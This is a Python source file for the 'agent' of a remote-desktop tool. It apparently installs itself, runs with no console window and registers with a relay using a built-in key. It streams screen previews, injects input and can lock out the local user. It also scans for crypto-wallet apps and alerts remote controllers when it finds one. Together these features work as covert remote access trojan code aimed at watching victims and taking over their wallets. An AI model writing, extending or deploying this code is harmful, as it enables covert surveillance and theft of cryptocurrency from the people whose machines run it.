"""Agent — runs on every machine you want to control.

Runs headless (no console window when built with --noconsole). Status goes
to a log file at ~/.remotedesk/agent.log instead of the screen.

On startup it REGISTERS with the relay using the baked-in network key, so it
appears in the dashboard automatically, and keeps a stable device id.
While registered it also streams low-rate JPEG previews for the dashboard.
"""
import argparse
import asyncio
import sys
import os
import uuid
import socket
import logging
import time
from logging.handlers import RotatingFileHandler
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

import websockets

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import protocol as P  # noqa: E402
import config  # noqa: E402
from agent.capture import ScreenCapturer  # noqa: E402
from agent.input_inject import InputInjector  # noqa: E402
from agent.input_block import make_input_blocker  # noqa: E402
from agent import startup  # noqa: E402
from agent.watch_apps import scan_matches  # noqa: E402
from protocol.connection import run_pair  # noqa: E402

BASE_DIR = Path.home() / ".remotedesk"
DEVICE_FILE = BASE_DIR / "device_id"
LOG_FILE = BASE_DIR / "agent.log"

# Dashboard thumbnails: keep bandwidth low even with many agents online.
PREVIEW_FPS = 2.0
PREVIEW_QUALITY = 32
PREVIEW_SCALE = 0.25

# Session stream defaults — full-res JPEG through a VPS is too slow.
DEFAULT_FPS = 8
DEFAULT_QUALITY = 45
DEFAULT_SCALE = 0.45

# How often to scan for crypto/wallet apps (process + window title).
WATCH_INTERVAL_SEC = 3.0

log = logging.getLogger("agent")


def setup_logging():
    BASE_DIR.mkdir(parents=True, exist_ok=True)
    log.setLevel(logging.INFO)
    fh = RotatingFileHandler(LOG_FILE, maxBytes=512 * 1024, backupCount=2,
                             encoding="utf-8")
    fh.setFormatter(logging.Formatter("%(asctime)s %(levelname)s %(message)s"))
    log.addHandler(fh)
    # Also echo to console if one exists (harmless when frozen with --noconsole)
    try:
        if sys.stdout is not None:
            sh = logging.StreamHandler()
            sh.setFormatter(logging.Formatter("%(asctime)s %(message)s"))
            log.addHandler(sh)
    except Exception:
        pass


def get_device_id() -> str:
    try:
        return DEVICE_FILE.read_text(encoding="utf-8").strip()
    except Exception:
        did = uuid.uuid4().hex[:12]
        try:
            DEVICE_FILE.parent.mkdir(parents=True, exist_ok=True)
            DEVICE_FILE.write_text(did, encoding="utf-8")
        except Exception:
            pass
        return did


class Agent:
    def __init__(self, args):
        self.args = args
        self.device_id = get_device_id()
        self.name = args.name or socket.gethostname()
        self.fps = args.fps
        self.quality = args.quality
        self.scale = args.scale
        # mss owns thread-local OS handles. Creation, capture and close must
        # all happen on the same worker, including after a relay reconnect.
        self._capture_pool = ThreadPoolExecutor(max_workers=1, thread_name_prefix="capture")
        try:
            self.cap = self._capture_pool.submit(ScreenCapturer, args.monitor).result()
        except Exception:
            self._capture_pool.shutdown()
            raise
        self.injector = InputInjector(
            self.cap.left, self.cap.top, self.cap.width, self.cap.height)
        self.blocker = make_input_blocker()
        self.blocker.start()
        self._peer_present = False
        # Latest-frame slot: overwrite instead of queuing so lag cannot build up.
        self._latest_session_jpeg: bytes | None = None
        self._latest_preview_jpeg: bytes | None = None
        self._frame_ready = asyncio.Event()

    async def run(self):
        log.info(f"device '{self.name}' id={self.device_id} relay={self.args.relay}")
        backoff = 1
        try:
            while True:
                try:
                    async with websockets.connect(self.args.relay, max_size=None,
                                                  close_timeout=2) as ws:
                        await ws.send(P.dumps(P.auth_agent(
                            self.args.network_key, self.device_id, self.name)))
                        log.info("online")
                        backoff = 1
                        self._latest_session_jpeg = None
                        self._latest_preview_jpeg = None
                        self._frame_ready = asyncio.Event()
                        await run_pair(
                            self._capture_loop(),
                            self._send_loop(ws),
                            self._recv(ws),
                            self._watch_apps(ws),
                        )
                except Exception as e:
                    log.warning(f"disconnected: {e!r}; retrying in {backoff}s")
                finally:
                    self._peer_present = False
                    self.injector.release_all()
                    self.blocker.unblock()
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 30)
        finally:
            await self.close()

    async def close(self):
        self.injector.release_all()
        self.blocker.stop()
        try:
            await asyncio.get_running_loop().run_in_executor(self._capture_pool, self.cap.close)
        finally:
            self._capture_pool.shutdown(wait=True)

    async def _capture_loop(self):
        """Capture as fast as configured; always keep only the newest JPEG."""
        next_preview = 0.0
        while True:
            now = time.monotonic()
            if not self._peer_present and now >= next_preview:
                try:
                    jpeg = await asyncio.get_running_loop().run_in_executor(
                        self._capture_pool, self.cap.grab_jpeg,
                        PREVIEW_QUALITY, PREVIEW_SCALE)
                except Exception as e:
                    log.error(f"preview capture error: {e!r}")
                else:
                    self._latest_preview_jpeg = jpeg
                    self._frame_ready.set()
                next_preview = now + 1 / PREVIEW_FPS
                await asyncio.sleep(min(0.2, max(0.02, next_preview - time.monotonic())))
                continue

            if self._peer_present:
                try:
                    jpeg = await asyncio.get_running_loop().run_in_executor(
                        self._capture_pool, self.cap.grab_jpeg,
                        self.quality, self.scale)
                except Exception as e:
                    log.error(f"capture error: {e!r}")
                else:
                    self._latest_session_jpeg = jpeg
                    self._frame_ready.set()
                await asyncio.sleep(1 / max(1, self.fps))
            else:
                await asyncio.sleep(0.05)

    async def _send_loop(self, ws):
        """Send the newest frame only — never drain a backlog of stale screens."""
        while True:
            await self._frame_ready.wait()
            self._frame_ready.clear()
            if self._peer_present:
                jpeg = self._latest_session_jpeg
                self._latest_session_jpeg = None
                if jpeg:
                    await ws.send(jpeg)
            else:
                jpeg = self._latest_preview_jpeg
                self._latest_preview_jpeg = None
                if jpeg:
                    # Binary only (no base64 JSON) — smaller and faster on the wire.
                    await ws.send(jpeg)

    async def _recv(self, ws):
        async for message in ws:
            if isinstance(message, bytes):
                continue
            try:
                msg = P.loads(message)
            except Exception:
                continue
            t = msg.get("type")
            if t == P.PEER_JOINED:
                self._peer_present = True
                self._latest_preview_jpeg = None
                log.info("controller connected")
            elif t == P.PEER_LEFT:
                self._peer_present = False
                self._latest_session_jpeg = None
                self.injector.release_all()
                self.blocker.unblock()
                log.info("controller left; input unblocked")
            elif t == P.INPUT_MOUSE:
                self.injector.handle_mouse(msg)
            elif t == P.INPUT_KEY:
                self.injector.handle_key(msg)
            elif t == P.LOCK_INPUT:
                self.blocker.block()
                log.info("local input BLOCKED")
            elif t == P.UNLOCK_INPUT:
                self.blocker.unblock()
                log.info("local input unblocked")
            elif t == P.CONFIG:
                if "fps" in msg:
                    self.fps = max(1, min(30, int(msg["fps"])))
                if "quality" in msg:
                    self.quality = max(10, min(95, int(msg["quality"])))
                if "scale" in msg:
                    self.scale = max(0.15, min(1.0, float(msg["scale"])))
            elif t == P.ERROR:
                log.error(f"relay error: {msg.get('message')}")

    async def _watch_apps(self, ws):
        """Detect wallet/crypto apps and notify every connected controller dashboard."""
        seen: set[str] = set()
        while True:
            try:
                matches = await asyncio.get_running_loop().run_in_executor(
                    None, scan_matches)
            except Exception as e:
                log.debug(f"watch_apps scan failed: {e!r}")
                matches = []
            current = {m.key for m in matches}
            for m in matches:
                if m.key in seen:
                    continue
                try:
                    await ws.send(P.dumps(P.alert(
                        m.label, m.detail,
                        device_id=self.device_id, device_name=self.name)))
                    log.info(f"alert: {m.label} on {self.name} ({m.detail})")
                except Exception as e:
                    log.warning(f"alert send failed: {e!r}")
                    raise
            seen = current
            await asyncio.sleep(WATCH_INTERVAL_SEC)


class ArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        # Packaged --noconsole builds have no stderr for argparse's default
        # error display. Let main log it and show the installation error.
        raise ValueError(message)


def parse_args(arguments=None):
    ap = ArgumentParser(description=(
        "RemoteDesk agent. The Windows exe installs itself on first launch. "
        "Use --portable to run without installing, or --install to register startup again."))
    ap.add_argument("--relay", default=config.RELAY_URL)
    ap.add_argument("--network-key", default=config.NETWORK_KEY, dest="network_key")
    ap.add_argument("--name", default="")
    ap.add_argument("--fps", type=int, default=DEFAULT_FPS)
    ap.add_argument("--quality", type=int, default=DEFAULT_QUALITY)
    ap.add_argument("--scale", type=float, default=DEFAULT_SCALE)
    ap.add_argument("--monitor", type=int, default=1)
    args = ap.parse_args(arguments)
    if not 1 <= args.fps <= 30:
        raise ValueError("FPS must be between 1 and 30.")
    if not 10 <= args.quality <= 95:
        raise ValueError("Quality must be between 10 and 95.")
    if not 0 < args.scale <= 1:
        raise ValueError("Scale must be greater than 0 and at most 1.")
    if args.monitor < 0:
        raise ValueError("Monitor index must be 0 or greater.")
    return args


if __name__ == "__main__":
    setup_logging()
    try:
        arguments = startup.prepare(sys.argv[1:], validate=parse_args)
        if arguments is not None and startup.acquire_instance():
            asyncio.run(Agent(parse_args(arguments)).run())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        log.exception(f"fatal: {e!r}")
        if "--run" not in sys.argv:
            startup.notify(str(e), error=True)
        sys.exit(1)
